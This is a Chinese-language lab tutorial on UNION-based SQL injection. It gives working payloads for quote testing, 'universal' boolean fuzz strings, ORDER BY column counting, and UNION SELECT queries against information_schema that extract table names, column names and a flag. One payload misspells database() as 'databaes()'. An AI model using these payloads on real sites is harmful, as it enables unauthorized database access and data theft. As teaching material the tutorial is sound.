**一、union联合注入**

1.先在要查询的对象后面加单引号'，测试是数字型还是字符型，原理是根据报错内容判断，比如下图中的报错是'1'''，多了一个单引号，说明查询语句里应该也有一个单引号，所以报错了，判断是字符型注入， 数据库查询语句为SELECT * FROM users WHERE id=’$id’  

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722517593437-94a1c292-2c16-4797-8f3b-127ff00f485e.png)

2.使用万能公式fuzz测试一下

```plain
# 万能公式
1 and 1=1
1' and '1'='1
1 or 1=1 
1' or '1'='1
```

	3. 使用联合注入，在注入之前需要判断前一句查询的字段数。利用order by X%23来查询数据库的字段数，如当语句为order by 5时查询结果正常，order by 6则报错，说明字段数为5

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722668392907-3decb448-24c6-45ee-86f5-9ccddeba54d9.png)

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722668888525-206ab6d8-edc6-40f6-9801-5c00d7fc2d2c.png)

4.查询数据库内容，一般流程是查数据库名->查表名->查列名->查flag

(1）首先查数据库名用database()，由于知道字段数为5，根据mysql查询语句`?id=-1'union select 1,2,3,4,5%23`可知会显示2和3的查询结果（输入id=-1的原因是当查到数据库中不存在的数据才会返回union select的结果），所以将查询语句改为`?id=-1'union select 1,databaes(),3,4,5%23`即可查到数据库名SQL01

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722695931779-1564d76f-ec8b-4272-8dfa-c13295f63e98.png)

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722695958840-bcf4f400-a224-4a89-81a0-e65b2c0a6f15.png)

(2)接下来查表名，通过数据库名SQL01查询，语句为`?id=-1'union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema="SQL01"%23`

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722696559665-884e790a-1da2-415f-90d3-70180af1b416.png)

(3)然后查询列名，语句为`?id=-1'union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name="users"%23`

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722696687426-f8657579-2263-4fd6-933a-f75557bfcd6e.png)

(4)最后找到flag`?id=-1'union select 1,flag,3,4,5 from users`

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1722696784989-0f5e685e-56fc-4cde-917b-d86cf08a4df0.png)

